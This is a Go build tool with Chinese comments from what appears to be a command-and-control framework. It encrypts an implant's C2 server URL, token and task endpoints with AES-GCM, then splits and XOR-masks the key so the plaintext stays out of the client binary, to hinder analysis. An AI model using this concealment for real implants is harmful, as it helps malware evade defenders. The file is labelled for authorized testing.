// secretgen 生成客户端内置 C2 配置的密文数据文件(c2secret/secretdata.go)。
//
// 用法(在仓库根目录):
//
//	go run ./tools/secretgen
//
// 明文不写在本工具中,而是直接读取 c2config 包常量(单一事实来源),
// 修改 c2config/config.go 后重新运行本工具,再执行 go test ./c2secret
// 校验解码结果,最后重编译客户端与服务端。明文仅存在于 c2config 包源码中,
// 不进入客户端二进制。仅用于经授权的测试环境。
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"go/format"
	"os"
	"path/filepath"

	"golin/c2config"
)

type entry struct {
	name  string // 变量名,如 blobServerURL
	value string // 明文,来自 c2config 包
}

func main() {
	entries := []entry{
		{"blobServerURL", c2config.ServerURL},
		{"blobToken", c2config.Token},
		{"blobHeader", c2config.HeaderName},
		{"blobReport", c2config.ReportPath},
		{"blobHealth", c2config.HealthPath},
		{"blobTasks", c2config.TasksPath},
		{"blobResult", c2config.ResultPath},
	}

	// 生成 32 字节随机密钥与 32 字节掩码;碎片中保存的是 key^mask,
	// 运行时组装碎片后与掩码异或还原出真正的 AES 密钥。
	key := make([]byte, 32)
	mask := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		fatal("生成密钥失败: %v", err)
	}
	if _, err := rand.Read(mask); err != nil {
		fatal("生成掩码失败: %v", err)
	}
	stored := make([]byte, 32)
	for i := range stored {
		stored[i] = key[i] ^ mask[i]
	}

	var buf bytes.Buffer
	_, _ = buf.WriteString("// Code generated by tools/secretgen; DO NOT EDIT.\n")
	_, _ = buf.WriteString("// 客户端内置 C2 配置的 AES-256-GCM 密文与密钥碎片(密态存储)。\n")
	_, _ = buf.WriteString("// 修改明文请编辑 c2config/config.go,然后重新运行本工具。\n")
	_, _ = buf.WriteString("// 仅用于经授权的测试环境。\n\n")
	_, _ = buf.WriteString("package c2secret\n\n")

	for i, e := range entries {
		blob := encrypt(key, []byte(e.value))
		_, _ = fmt.Fprintf(&buf, "// %s 密文(nonce + 密文 + tag)\n", e.name)
		_, _ = fmt.Fprintf(&buf, "var %s = []byte{", e.name)
		writeBytes(&buf, blob)
		_, _ = buf.WriteString("}\n")
		if i != len(entries)-1 {
			_, _ = buf.WriteString("\n")
		}
	}

	_, _ = fmt.Fprintf(&buf, "\n// 密钥碎片四段(已与掩码异或,见 secret.go 的 assembleKey)\n")
	half := 8
	_, _ = fmt.Fprintf(&buf, "var keyA = []byte{")
	writeBytes(&buf, stored[0:half])
	_, _ = buf.WriteString("}\n")
	_, _ = fmt.Fprintf(&buf, "var keyB = []byte{")
	writeBytes(&buf, stored[half:2*half])
	_, _ = buf.WriteString("}\n")
	_, _ = fmt.Fprintf(&buf, "var keyC = []byte{")
	writeBytes(&buf, stored[2*half:3*half])
	_, _ = buf.WriteString("}\n")
	_, _ = fmt.Fprintf(&buf, "var keyD = []byte{")
	writeBytes(&buf, stored[3*half:])
	_, _ = buf.WriteString("}\n")

	_, _ = fmt.Fprintf(&buf, "\n// 掩码两段\n")
	_, _ = fmt.Fprintf(&buf, "var maskP = []byte{")
	writeBytes(&buf, mask[:half])
	_, _ = buf.WriteString("}\n")
	_, _ = fmt.Fprintf(&buf, "var maskQ = []byte{")
	writeBytes(&buf, mask[half:])
	_, _ = buf.WriteString("}\n")

	src, err := format.Source(buf.Bytes())
	if err != nil {
		fatal("格式化生成代码失败: %v", err)
	}
	out := filepath.Join("c2secret", "secretdata.go")
	if err := os.WriteFile(out, src, 0644); err != nil {
		fatal("写入 %s 失败: %v", out, err)
	}
	fmt.Printf("[*] 已生成 %s (%d 条密文)\n", out, len(entries))
	fmt.Println("[*] 下一步: go test ./c2secret 校验解码,然后重新编译两端")
}

// encrypt 用派生密钥对明文做 AES-256-GCM 加密,返回 nonce+密文+tag
func encrypt(key, plain []byte) []byte {
	sum := sha256.Sum256(key)
	block, err := aes.NewCipher(sum[:])
	if err != nil {
		fatal("创建 AES 块失败: %v", err)
	}
	g, err := cipher.NewGCM(block)
	if err != nil {
		fatal("创建 GCM 失败: %v", err)
	}
	nonce := make([]byte, g.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		fatal("生成 nonce 失败: %v", err)
	}
	return g.Seal(nonce, nonce, plain, nil)
}

// writeBytes 以 0xNN 形式写出字节数组
func writeBytes(buf *bytes.Buffer, b []byte) {
	for i, v := range b {
		if i%12 == 0 {
			_, _ = buf.WriteString("\n\t")
		}
		_, _ = fmt.Fprintf(buf, "0x%02x, ", v)
	}
	_, _ = buf.WriteString("\n")
}

func fatal(format string, a ...interface{}) {
	_, _ = fmt.Fprintf(os.Stderr, "[-] "+format+"\n", a...)
	os.Exit(1)
}
